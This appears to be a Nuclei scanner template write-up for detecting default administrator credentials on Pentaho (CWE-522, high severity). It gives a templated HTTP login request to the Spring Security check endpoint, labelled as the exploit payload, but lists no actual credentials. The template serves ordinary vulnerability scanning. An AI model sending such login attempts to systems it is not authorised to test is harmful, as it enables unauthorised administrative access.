# Nuclei Template: Pentaho Default Login
**Template ID:** pentaho-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`pentaho-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Pentaho default admin credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /pentaho/j_spring_security_check HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

j_username={{user}}&j_password={{pass}}
```

## References
- https://www.hitachivantara.com/en-us/pdfd/training/pentaho-lesson-1-user-console-overview.pdf
